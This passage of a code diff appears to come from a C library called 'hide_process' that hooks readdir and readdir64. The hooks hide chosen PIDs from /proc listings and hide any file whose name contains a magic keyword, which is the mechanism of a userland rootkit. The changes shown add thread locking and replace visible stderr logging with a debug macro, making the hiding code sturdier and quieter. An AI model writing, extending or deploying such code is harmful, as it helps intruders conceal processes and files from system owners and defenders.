             strncpy(dir_path, tracked_dirs[i].path, sizeof(dir_path) - 1);
@@ -636,26 +841,24 @@ struct dirent *readdir(DIR *dirp) {
             break;
         }
     }
+    pthread_mutex_unlock(&tracked_dirs_lock);
 
     // Keep reading until we find an entry we shouldn't hide
     while ((entry = original_readdir(dirp)) != NULL) {
         // For /proc, check if it's a PID that should be hidden
         if (is_proc && is_numeric(entry->d_name)) {
-            fprintf(stderr, "[hide_process] readdir found PID: %s\n", entry->d_name);
-            fflush(stderr);
+            DEBUG_LOG("readdir found PID: %s\n", entry->d_name);
 
             if (should_hide_pid(entry->d_name)) {
-                fprintf(stderr, "[hide_process] Skipping hidden PID: %s\n", entry->d_name);
-                fflush(stderr);
+                DEBUG_LOG("Skipping hidden PID: %s\n", entry->d_name);
                 continue;  // Skip this entry, read next one
             }
         }
 
         // For ANY directory, check if filename contains any magic keyword
         if (contains_magic_keyword(entry->d_name)) {
-            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
+            DEBUG_LOG("*** Hiding file '%s' in directory '%s' ***\n",
                     entry->d_name, dir_path);
-            fflush(stderr);
             continue;  // Skip this entry, read next one
         }
 
@@ -672,12 +875,10 @@ struct dirent64 *readdir64(DIR *dirp) {
     struct dirent64 *entry;
 
     if (!original_readdir64) {
-        fprintf(stderr, "[hide_process] Loading original readdir64...\n");
-        fflush(stderr);
+        DEBUG_LOG("Loading original readdir64...\n");
         original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
         if (!original_readdir64) {
-            fprintf(stderr, "[hide_process] FATAL: Failed to load original readdir64\n");
-            fflush(stderr);
+            DEBUG_LOG("FATAL: Failed to load original readdir64\n");
             return NULL;
         }
     }
@@ -685,6 +886,7 @@ struct dirent64 *readdir64(DIR *dirp) {
     // Find which directory this is
     int is_proc = 0;
     char dir_path[256] = "";
+    pthread_mutex_lock(&tracked_dirs_lock);
     for (int i = 0; i < tracked_dir_count; i++) {
         if (tracked_dirs[i].dir == dirp) {
             strncpy(dir_path, tracked_dirs[i].path, sizeof(dir_path) - 1);
@@ -694,26 +896,24 @@ struct dirent64 *readdir64(DIR *dirp) {
             break;
         }
     }
+    pthread_mutex_unlock(&tracked_dirs_lock);
 
     // Keep reading until we find an entry we shouldn't hide
     while ((entry = original_readdir64(dirp)) != NULL) {
         // For /proc, check if it's a PID that should be hidden
         if (is_proc && is_numeric(entry->d_name)) {
-            fprintf(stderr, "[hide_process] readdir64 found PID: %s\n", entry->d_name);
-            fflush(stderr);
+            DEBUG_LOG("readdir64 found PID: %s\n", entry->d_name);
 
             if (should_hide_pid(entry->d_name)) {
-                fprintf(stderr, "[hide_process] Skipping hidden PID: %s\n", entry->d_name);
-                fflush(stderr);
+                DEBUG_LOG("Skipping hidden PID: %s\n", entry->d_name);
                 continue;  // Skip this entry, read next one
             }
         }
 
         // For ANY directory, check if filename contains any magic keyword
         if (contains_magic_keyword(entry->d_name)) {
-            fprintf(stderr, "[hide_process] *** Hiding file '%s' in directory '%s' ***\n",
+            DEBUG_LOG("*** Hiding file '%s' in directory '%s' ***\n",
                     entry->d_name, dir_path);
-            fflush(stderr);
             continue;  // Skip this entry, read next one
         }
 
